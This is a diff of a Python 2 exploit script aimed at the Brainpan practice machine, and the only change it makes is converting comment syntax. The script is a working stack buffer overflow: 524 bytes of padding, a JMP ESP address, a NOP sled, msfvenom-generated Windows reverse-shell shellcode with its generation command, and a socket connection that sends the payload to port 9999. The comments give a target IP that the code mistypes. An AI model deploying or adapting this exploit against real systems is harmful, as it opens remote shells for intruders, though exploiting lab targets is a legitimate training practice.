@@ -1,16 +1,16 @@
-//This is the Final Code of Buffer Overflow of the Brainpan. 
-//Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
-//This script is based on python2
+#This is the Final Code of Buffer Overflow of the Brainpan. 
+#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
+#This script is based on python2
 
 import socket
 
 import sys
 
-//JMP ESP = 311712F3
+#JMP ESP = 311712F3
 
 buff = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 
 
-//msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"
+#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"
 
 buf += b"\xbf\xa5\xaa\x61\xca\xda\xcf\xd9\x74\x24\xf4\x5e\x2b"
 buf += b"\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x4b\x56\x83"
@@ -42,8 +42,8 @@ buf += b"\x85\x37\x9b\x83\x01\xa4\xd1\x9c\xe7\xca\x46\x9c\x2d"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-//RHOST = 192.168.1.14 (Change according to your IP)
-//RPORT = 9999 (Change according to your Vulnerable service port)
+#RHOST = 192.168.1.14 (Change according to your IP)
+#RPORT = 9999 (Change according to your Vulnerable service port)
 
 try:
 	s.connect(('192.186.1.14', 9999))
